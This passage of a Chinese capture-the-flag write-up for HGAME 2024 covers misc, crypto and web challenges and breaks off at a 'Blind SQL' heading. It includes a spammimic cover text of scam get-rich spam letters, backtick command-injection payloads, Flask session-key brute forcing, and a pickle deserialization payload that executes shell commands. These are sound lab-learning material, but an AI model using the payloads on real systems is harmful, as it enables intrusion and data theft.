class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs tp">Dear E-Commerce professional ; This letter was specially<br>selected to be sent to you . We will comply with all<br>removal requests <span class="hljs-comment">! This mail is being sent in compliance</span><br><span class="hljs-comment">with Senate bill 1620 ;</span> Title <span class="hljs-number">3</span> ; Section <span class="hljs-number">308</span> <span class="hljs-comment">! This</span><br><span class="hljs-comment">is not a get rich scheme ! Why work for somebody else</span><br><span class="hljs-comment">when you can become rich in 27 MONTHS . Have you ever</span><br><span class="hljs-comment">noticed more people than ever are surfing the web and</span><br><span class="hljs-comment">more people than ever are surfing the web . Well, now</span><br><span class="hljs-comment">is your chance to capitalize on this ! WE will help</span><br><span class="hljs-comment">YOU use credit cards on your website plus turn your</span><br><span class="hljs-comment">business into an E-BUSINESS . You are guaranteed to</span><br><span class="hljs-comment">succeed because we take all the risk ! But don&#x27;t believe</span><br><span class="hljs-comment">us . Ms Simpson who resides in Maine tried us and says</span><br><span class="hljs-comment">&quot;I&#x27;ve been poor and I&#x27;ve been rich - rich is better&quot;</span><br><span class="hljs-comment">. We are a BBB member in good standing ! We urge you</span><br><span class="hljs-comment">to contact us today for your own future financial well-being</span><br><span class="hljs-comment">. Sign up a friend and you&#x27;ll get a discount of 50%</span><br><span class="hljs-comment">. Thank-you for your serious consideration of our offer</span><br><span class="hljs-comment">! Dear Friend ;</span> This letter was specially selected<br>to be sent to you <span class="hljs-comment">! We will comply with all removal</span><br><span class="hljs-comment">requests . This mail is being sent in compliance with</span><br><span class="hljs-comment">Senate bill 2316 ;</span> Title <span class="hljs-number">8</span> , Section <span class="hljs-number">301</span> <span class="hljs-comment">! Do NOT confuse</span><br><span class="hljs-comment">us with Internet scam artists . Why work for somebody</span><br><span class="hljs-comment">else when you can become rich as few as 24 WEEKS !</span><br><span class="hljs-comment">Have you ever noticed more people than ever are surfing</span><br><span class="hljs-comment">the web plus how many people you know are on the Internet</span><br><span class="hljs-comment">. Well, now is your chance to capitalize on this .</span><br><span class="hljs-comment">We will help you decrease perceived waiting time by</span><br><span class="hljs-comment">200% and turn your business into an E-BUSINESS . You</span><br><span class="hljs-comment">are guaranteed to succeed because we take all the risk</span><br><span class="hljs-comment">. But don&#x27;t believe us . Mrs Simpson of Illinois tried</span><br><span class="hljs-comment">us and says &quot;Now I&#x27;m rich many more things are possible&quot;</span><br><span class="hljs-comment">! We assure you that we operate within all applicable</span><br><span class="hljs-comment">laws ! Do not delay - order today . Sign up a friend</span><br><span class="hljs-comment">and your friend will be rich too . Warmest regards</span><br><span class="hljs-comment">! Dear Sir or Madam ;</span> Especially for you - this hot<br>information . We will comply with all removal requests<br><span class="hljs-comment">! This mail is being sent in compliance with Senate</span><br><span class="hljs-comment">bill 1916 ;</span> Title <span class="hljs-number">2</span> , Section <span class="hljs-number">301</span> <span class="hljs-comment">! THIS IS NOT MULTI-LEVEL</span><br><span class="hljs-comment">MARKETING ! Why work for somebody else when you can</span><br><span class="hljs-comment">become rich in 89 days . Have you ever noticed most</span><br><span class="hljs-comment">everyone has a cellphone plus most everyone has a cellphone</span><br><span class="hljs-comment">! Well, now is your chance to capitalize on this !</span><br><span class="hljs-comment">WE will help YOU sell more &amp; SELL MORE . You can begin</span><br><span class="hljs-comment">at absolutely no cost to you . But don&#x27;t believe us</span><br><span class="hljs-comment">. Mr Jones of Minnesota tried us and says &quot;I was skeptical</span><br><span class="hljs-comment">but it worked for me&quot; ! We assure you that we operate</span><br><span class="hljs-comment">within all applicable laws ! We beseech you - act now</span><br><span class="hljs-comment">. Sign up a friend and you&#x27;ll get a discount of 90%</span><br><span class="hljs-comment">. Thanks . Dear Cybercitizen ;</span> Your email address has<br>been submitted to us indicating your interest in our<br>newsletter . If you are not interested in our publications<br>and wish to be removed from our lists, simply do NOT<br>respond and ignore this mail <span class="hljs-comment">! This mail is being sent</span><br><span class="hljs-comment">in compliance with Senate bill 2016 , Title 2 , Section</span><br><span class="hljs-comment">304 . This is different than anything else you&#x27;ve seen</span><br><span class="hljs-comment">! Why work for somebody else when you can become rich</span><br><span class="hljs-comment">in 48 weeks ! Have you ever noticed more people than</span><br><span class="hljs-comment">ever are surfing the web plus people love convenience</span><br><span class="hljs-comment">! Well, now is your chance to capitalize on this .</span><br><span class="hljs-comment">WE will help YOU deliver goods right to the customer&#x27;s</span><br><span class="hljs-comment">doorstep &amp; turn your business into an E-BUSINESS .</span><br><span class="hljs-comment">You can begin at absolutely no cost to you . But don&#x27;t</span><br><span class="hljs-comment">believe us . Ms Anderson who resides in New York tried</span><br><span class="hljs-comment">us and says &quot;My only problem now is where to park all</span><br><span class="hljs-comment">my cars&quot; ! We are a BBB member in good standing . If</span><br><span class="hljs-comment">not for you then for your LOVED ONES - act now ! Sign</span><br><span class="hljs-comment">up a friend and you&#x27;ll get a discount of 20% ! God</span><br><span class="hljs-comment">Bless . Dear Colleague , Your email address has been</span><br><span class="hljs-comment">submitted to us indicating your interest in our publication</span><br><span class="hljs-comment">. If you no longer wish to receive our publications</span><br><span class="hljs-comment">simply reply with a Subject: of &quot;REMOVE&quot; and you will</span><br><span class="hljs-comment">immediately be removed from our mailing list . This</span><br><span class="hljs-comment">mail is being sent in compliance with Senate bill 2416</span><br><span class="hljs-comment">, Title 9 ;</span> Section <span class="hljs-number">308</span> <span class="hljs-comment">! This is NOT unsolicited bulk</span><br><span class="hljs-comment">mail . Why work for somebody else when you can become</span><br><span class="hljs-comment">rich within 24 MONTHS ! Have you ever noticed most</span><br><span class="hljs-comment">everyone has a cellphone and people love convenience</span><br><span class="hljs-comment">. Well, now is your chance to capitalize on this !</span><br><span class="hljs-comment">We will help you decrease perceived waiting time by</span><br><span class="hljs-comment">190% and sell more ! The best thing about our system</span><br><span class="hljs-comment">is that it is absolutely risk free for you ! But don&#x27;t</span><br><span class="hljs-comment">believe us . Mrs Anderson of Indiana tried us and says</span><br><span class="hljs-comment">&quot;Now I&#x27;m rich, Rich, RICH&quot; . This offer is 100% legal</span><br><span class="hljs-comment">. So make yourself rich now by ordering immediately</span><br><span class="hljs-comment">. Sign up a friend and your friend will be rich too</span><br><span class="hljs-comment">. God Bless ! Dear Colleague ;</span> We know you are interested<br>in receiving amazing information <span class="hljs-comment">! If you are not interested</span><br><span class="hljs-comment">in our publications and wish to be removed from our</span><br><span class="hljs-comment">lists, simply do NOT respond and ignore this mail !</span><br><span class="hljs-comment">This mail is being sent in compliance with Senate bill</span><br><span class="hljs-comment">1619 , Title 7 , Section 303 ! This is not multi-level</span><br><span class="hljs-comment">marketing . Why work for somebody else when you can</span><br><span class="hljs-comment">become rich within 37 days ! Have you ever noticed</span><br><span class="hljs-comment">nobody is getting any younger plus people love convenience</span><br><span class="hljs-comment">! Well, now is your chance to capitalize on this .</span><br><span class="hljs-comment">WE will help YOU decrease perceived waiting time by</span><br><span class="hljs-comment">140% plus deliver goods right to the customer&#x27;s doorstep</span><br><span class="hljs-comment">. You can begin at absolutely no cost to you . But</span><br><span class="hljs-comment">don&#x27;t believe us ! Mrs Simpson of Illinois tried us</span><br><span class="hljs-comment">and says &quot;I was skeptical but it worked for me&quot; . We</span><br><span class="hljs-comment">are licensed to operate in all states ! Because the</span><br><span class="hljs-comment">Internet operates on &quot;Internet time&quot; you must make</span><br><span class="hljs-comment">a commitment soon ! Sign up a friend and you get half</span><br><span class="hljs-comment">off ! Thank-you for your serious consideration of our</span><br><span class="hljs-comment">offer . Dear Friend ;</span> We know you are interested in<br>receiving amazing info <span class="hljs-comment">! We will comply with all removal</span><br><span class="hljs-comment">requests . This mail is being sent in compliance with</span><br><span class="hljs-comment">Senate bill 2716 , Title 5 , Section 303 ! This is</span><br><span class="hljs-comment">not a get rich scheme . Why work for somebody else</span><br><span class="hljs-comment">when you can become rich within 52 days ! Have you</span><br><span class="hljs-comment">ever noticed how many people you know are on the Internet</span><br><span class="hljs-comment">and the baby boomers are more demanding than their</span><br><span class="hljs-comment">parents ! Well, now is your chance to capitalize on</span><br><span class="hljs-comment">this . WE will help YOU decrease perceived waiting</span><br><span class="hljs-comment">time by 170% and turn your business into an E-BUSINESS</span><br><span class="hljs-comment">. You are guaranteed to succeed because we take all</span><br><span class="hljs-comment">the risk ! But don&#x27;t believe us ! Mrs Anderson who</span><br><span class="hljs-comment">resides in Alabama tried us and says &quot;Now I&#x27;m rich,</span><br><span class="hljs-comment">Rich, RICH&quot; ! We are a BBB member in good standing</span><br><span class="hljs-comment">. So make yourself rich now by ordering immediately</span><br><span class="hljs-comment">! Sign up a friend and you get half off ! Thanks .</span><br><span class="hljs-comment">Dear Salaryman ;</span> Especially for you - this red-hot<br>news <span class="hljs-comment">! We will comply with all removal requests . This</span><br><span class="hljs-comment">mail is being sent in compliance with Senate bill 1618</span><br><span class="hljs-comment">, Title 4 , Section 308 . THIS IS NOT MULTI-LEVEL MARKETING</span><br><span class="hljs-comment">. Why work for somebody else when you can become rich</span><br><span class="hljs-comment">inside 27 days ! Have you ever noticed nearly every</span><br><span class="hljs-comment">commercial on television has a .com on in it &amp; nearly</span><br><span class="hljs-comment">every commercial on television has a .com on in it</span><br><span class="hljs-comment">! Well, now is your chance to capitalize on this !</span><br><span class="hljs-comment">WE will help YOU decrease perceived waiting time by</span><br><span class="hljs-comment">180% plus turn your business into an E-BUSINESS . You</span><br><span class="hljs-comment">can begin at absolutely no cost to you ! But don&#x27;t</span><br><span class="hljs-comment">believe us ! Prof Ames who resides in Washington tried</span><br><span class="hljs-comment">us and says &quot;I was skeptical but it worked for me&quot;</span><br><span class="hljs-comment">. We assure you that we operate within all applicable</span><br><span class="hljs-comment">laws ! We implore you - act now . Sign up a friend</span><br><span class="hljs-comment">and you&#x27;ll get a discount of 10% . Thank-you for your</span><br><span class="hljs-comment">serious consideration of our offer ! Dear Friend ;</span><br>This letter was specially selected to be sent to you<br><span class="hljs-comment">! If you no longer wish to receive our publications</span><br><span class="hljs-comment">simply reply with a Subject: of &quot;REMOVE&quot; and you will</span><br><span class="hljs-comment">immediately be removed from our club ! This mail is</span><br><span class="hljs-comment">being sent in compliance with Senate bill 1622 , Title</span><br><span class="hljs-comment">7 ;</span> Section <span class="hljs-number">303</span> <span class="hljs-comment">! Do NOT confuse us with Internet scam</span><br><span class="hljs-comment">artists . Why work for somebody else when you can become</span><br><span class="hljs-comment">rich in 10 weeks ! Have you ever noticed people will</span><br><span class="hljs-comment">do almost anything to avoid mailing their bills &amp; people</span><br><span class="hljs-comment">love convenience ! Well, now is your chance to capitalize</span><br><span class="hljs-comment">on this . WE will help YOU turn your business into</span><br><span class="hljs-comment">an E-BUSINESS &amp; SELL MORE . You can begin at absolutely</span><br><span class="hljs-comment">no cost to you ! But don&#x27;t believe us . Mr Ames of</span><br><span class="hljs-comment">Louisiana tried us and says &quot;Now I&#x27;m rich, Rich, RICH&quot;</span><br><span class="hljs-comment">. We are licensed to operate in all states . We BESEECH</span><br><span class="hljs-comment">you - act now . Sign up a friend and you&#x27;ll get a discount</span><br><span class="hljs-comment">of 50% ! Thank-you for your serious consideration of</span><br><span class="hljs-comment">our offer .</span><br></code></pre></td></tr></table></figure><p><a href="https://www.spammimic.com/decode.cgi">https://www.spammimic.com/decode.cgi</a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">籱籰籪籶籮粄簹籴籨粂籸籾籨籼簹籵籿籮籨籪籵簺籨籽籱簼籨籼籮籬类簼籽粆<br></code></pre></td></tr></table></figure><p>转unicode</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;#x7c71;</span><span class="hljs-symbol">&amp;#x7c70;</span><span class="hljs-symbol">&amp;#x7c6a;</span><span class="hljs-symbol">&amp;#x7c76;</span><span class="hljs-symbol">&amp;#x7c6e;</span><span class="hljs-symbol">&amp;#x7c84;</span><span class="hljs-symbol">&amp;#x7c39;</span><span class="hljs-symbol">&amp;#x7c74;</span><span class="hljs-symbol">&amp;#x7c68;</span><span class="hljs-symbol">&amp;#x7c82;</span><span class="hljs-symbol">&amp;#x7c78;</span><span class="hljs-symbol">&amp;#x7c7e;</span><span class="hljs-symbol">&amp;#x7c68;</span><span class="hljs-symbol">&amp;#x7c7c;</span><span class="hljs-symbol">&amp;#x7c39;</span><span class="hljs-symbol">&amp;#x7c75;</span><span class="hljs-symbol">&amp;#x7c7f;</span><span class="hljs-symbol">&amp;#x7c6e;</span><span class="hljs-symbol">&amp;#x7c68;</span><span class="hljs-symbol">&amp;#x7c6a;</span><span class="hljs-symbol">&amp;#x7c75;</span><span class="hljs-symbol">&amp;#x7c3a;</span><span class="hljs-symbol">&amp;#x7c68;</span><span class="hljs-symbol">&amp;#x7c7d;</span><span class="hljs-symbol">&amp;#x7c71;</span><span class="hljs-symbol">&amp;#x7c3c;</span><span class="hljs-symbol">&amp;#x7c68;</span><span class="hljs-symbol">&amp;#x7c7c;</span><span class="hljs-symbol">&amp;#x7c6e;</span><span class="hljs-symbol">&amp;#x7c6c;</span><span class="hljs-symbol">&amp;#x7c7b;</span><span class="hljs-symbol">&amp;#x7c3c;</span><span class="hljs-symbol">&amp;#x7c7d;</span><span class="hljs-symbol">&amp;#x7c86;</span><br></code></pre></td></tr></table></figure><p>取后两位数字</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">71</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">76</span> <span class="hljs-number">6</span>e <span class="hljs-number">84</span> <span class="hljs-number">39</span> <span class="hljs-number">74</span> <span class="hljs-number">68</span> <span class="hljs-number">82</span> <span class="hljs-number">78</span> <span class="hljs-number">7</span>e <span class="hljs-number">68</span> <span class="hljs-number">7</span>c <span class="hljs-number">39</span> <span class="hljs-number">75</span> <span class="hljs-number">7</span>f <span class="hljs-number">6</span>e <span class="hljs-number">68</span> <span class="hljs-number">6</span>a <span class="hljs-number">75</span> <span class="hljs-number">3</span>a <span class="hljs-number">68</span> <span class="hljs-number">7</span>d <span class="hljs-number">71</span> <span class="hljs-number">3</span>c <span class="hljs-number">68</span> <span class="hljs-number">7</span>c <span class="hljs-number">6</span>e <span class="hljs-number">6</span>c <span class="hljs-number">7</span>b <span class="hljs-number">3</span>c <span class="hljs-number">7</span>d <span class="hljs-number">86</span> <br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-string">&#x27;71 70 6a 76 6e 84 39 74 68 82 78 7e 68 7c 39 75 7f 6e 68 6a 75 3a 68 7d 71 3c 68 7c 6e 6c 7b 3c 7d 86 &#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a.split(<span class="hljs-string">&#x27; &#x27;</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)-<span class="hljs-number">9</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#hgame&#123;0k_you_s0lve_al1_th3_secr3t&#125;</span><br></code></pre></td></tr></table></figure><h3 id="龙之舞"><a href="#龙之舞" class="headerlink" title="龙之舞"></a>龙之舞</h3><p>频谱图上下镜像翻转<br><img src="/mdimg/hgame2024/1707833030899-302cedf1-0932-4d2c-8746-8fa791e73676.png"><br><code>5H8w1nlWCX3hQLG</code><br>deepsound<br>得到gif，分离出4部分二维码然后拼接<br><a href="https://merri.cx/qrazybox/">https://merri.cx/qrazybox/</a><br>用tools的<img src="/mdimg/hgame2024/1708005124237-203dcb84-5ac0-4a09-bdcd-422912282fe1.png">模块<br><img src="/mdimg/hgame2024/1708005147696-3eb7f8a4-b9b5-4a03-9c39-a83aafc43822.png"></p><h2 id="crypto-1"><a href="#crypto-1" class="headerlink" title="crypto"></a>crypto</h2><h3 id="midRSA"><a href="#midRSA" class="headerlink" title="midRSA"></a>midRSA</h3><p>把flag泄露出来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>a= <span class="hljs-number">13292147408567087351580732082961640130543313742210409432471625281702327748963274496942276607</span><br><span class="hljs-built_in">print</span>(long_to_bytes(a))<br><span class="hljs-comment">#b&#x27;hgame&#123;0ther_cas3s_0f_c0ppr3smith&#125;\xff\xff\xff\xff\xff&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="backpack"><a href="#backpack" class="headerlink" title="backpack"></a>backpack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>enc = <span class="hljs-number">871114172567853490297478570113449366988793760172844644007566824913350088148162949968812541218339</span><br>a = [<span class="hljs-number">3245882327</span>, <span class="hljs-number">3130355629</span>, <span class="hljs-number">2432460301</span>, <span class="hljs-number">3249504299</span>, <span class="hljs-number">3762436129</span>, <span class="hljs-number">3056281051</span>, <span class="hljs-number">3484499099</span>, <span class="hljs-number">2830291609</span>, <span class="hljs-number">3349739489</span>, <span class="hljs-number">2847095593</span>, <span class="hljs-number">3532332619</span>, <span class="hljs-number">2406839203</span>, <span class="hljs-number">4056647633</span>, <span class="hljs-number">3204059951</span>, <span class="hljs-number">3795219419</span>, <span class="hljs-number">3240880339</span>, <span class="hljs-number">2668368499</span>, <span class="hljs-number">4227862747</span>, <span class="hljs-number">2939444527</span>, <span class="hljs-number">3375243559</span>]<br>bag = <span class="hljs-number">45893025064</span><br><br><span class="hljs-comment"># Reconstruct p</span><br>p = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> prime <span class="hljs-keyword">in</span> a:<br>    <span class="hljs-keyword">if</span> bag % prime == <span class="hljs-number">0</span>:<br>        p |= <span class="hljs-number">1</span><br>    p &lt;&lt;= <span class="hljs-number">1</span><br>    bag //= prime<br><br>p &gt;&gt;= <span class="hljs-number">1</span>  <span class="hljs-comment"># Remove the extra left shift at the end of the loop</span><br><br><span class="hljs-comment"># Decrypt the ciphertext</span><br>dec = enc ^ p<br><br>flag = long_to_bytes(dec)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#hgame&#123;M@ster_0f ba3kpack_m4nag3ment!&#125;</span><br><br></code></pre></td></tr></table></figure><h2 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h2><h3 id="What-the-cow-say"><a href="#What-the-cow-say" class="headerlink" title="What the cow say?"></a>What the cow say?</h3><p>可以命令执行<br>fuzz一下，可以用反引号和print</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">print</span> `<span class="hljs-built_in">ls</span> /`<br></code></pre></td></tr></table></figure><p><img src="/mdimg/hgame2024/2.png"></p><p>flag在<code>flag_is_here/flag_c0w54y</code><br>过滤了flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">print</span> `/f*/f*`<br></code></pre></td></tr></table></figure><h3 id="myflask"><a href="#myflask" class="headerlink" title="myflask"></a>myflask</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request, send_file<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">from</span> pytz <span class="hljs-keyword">import</span> timezone<br><br>currentDateAndTime = datetime.now(timezone(<span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span>))<br>currentTime = currentDateAndTime.strftime(<span class="hljs-string">&quot;%H%M%S&quot;</span>)<br><br>app = Flask(__name__)<br><span class="hljs-comment"># Tips: Try to crack this first ↓</span><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = currentTime<br><span class="hljs-built_in">print</span>(currentTime)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span><br>    <span class="hljs-keyword">return</span> send_file(<span class="hljs-string">&#x27;app.py&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;There is no session available in your client :(&#x27;</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;You are &#123;&#125; now&#x27;</span>.<span class="hljs-built_in">format</span>(session[<span class="hljs-string">&#x27;username&#x27;</span>])<br>    <br>    <span class="hljs-comment"># For POST requests from admin</span><br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        pickle_data=base64.b64decode(request.form.get(<span class="hljs-string">&#x27;pickle_data&#x27;</span>))<br>        <span class="hljs-comment"># Tips: Here try to trigger RCE</span><br>        userdata=pickle.loads(pickle_data)<br>        <span class="hljs-keyword">return</span> userdata<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Access Denied&#x27;</span><br> <br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br></code></pre></td></tr></table></figure><p>看源码一目了然就是session伪造加pickle反序列化<br>session的key为当前时间<code>app.config[&#39;SECRET_KEY&#39;] = currentTime</code><br>靶机开启时脚本运行key就被创建，以靶机创建时间为key<br>看开靶机时的大概时间，如23：56：则前后试试<br>也可以用<code>flask-unsign</code>直接爆破<br>GitHub下载源码然后<code>python setup.py install</code><br>生成字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 打开文件准备写入</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-comment"># 循环生成密码</span><br>    <span class="hljs-keyword">for</span> number <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000000</span>):<br>        <span class="hljs-comment"># 生成6位随机数，不足前面补0</span><br>        password = <span class="hljs-built_in">format</span>(number, <span class="hljs-string">&#x27;06d&#x27;</span>)<br>        <span class="hljs-comment"># 将密码写入文件</span><br>        file.write(password + <span class="hljs-string">&#x27;\n&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;密码生成完成。&quot;</span>)<br><br></code></pre></td></tr></table></figure><p><code>flask-unsign --unsign --cookie &#39;eyJ1c2VybmFtZSI6Imd1ZXN0In0.Zc40VA.I1YZ3EhqqmkBJpga_wgyLGYS7UI&#39; --no-literal-eval --wordlist 1.txt</code><br><img src="/mdimg/hgame2024/1708088303765-e90ba744-eea1-4a03-972f-d0a99db4d8ae.png"><br><code>235654</code><br>或者手打<br><img src="/mdimg/hgame2024/1708013439710-efc80eb1-21e2-4740-a440-f671496951b9.png"><br>然后用伪造的session<br><img src="/mdimg/hgame2024/1708013603038-c3d0da69-3f88-4da4-b46a-4ba6310284fe.png"><br>然后报错构造反序列化，要在linux跑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>,(<span class="hljs-string">&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;tac /flag&#x27;).read())&quot;</span>,))<br>a=A()<br>test=pickle.dumps(a)<br><span class="hljs-built_in">print</span>(base64.b64encode(test))<br><span class="hljs-comment">#b&#x27;gASVVwAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIw7cmFpc2UgRXhjZXB0aW9uKF9faW1wb3J0X18oJ29zJykucG9wZW4oJ3RhYyAvZmxhZycpLnJlYWQoKSmUhZRSlC4=&#x27;</span><br><br></code></pre></td></tr></table></figure><p><img src="/mdimg/hgame2024/1708013297126-cc77305d-a4ba-4e68-9eff-30cf7d2b4b94.png"></p><h1 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h1><h2 id="misc-2"><a href="#misc-2" class="headerlink" title="misc"></a>misc</h2><h3 id="与ai聊天"><a href="#与ai聊天" class="headerlink" title="与ai聊天"></a>与ai聊天</h3><p><img src="/mdimg/hgame2024/1707925876069-d45cde6e-4e8f-4c5d-a6d5-18579da5e96f.png"></p><h3 id="Blind-SQL-Injection"><a href="#Blind-SQL-Injection" class="headerlink" title="Blind SQL Injection"></a>Blind SQL 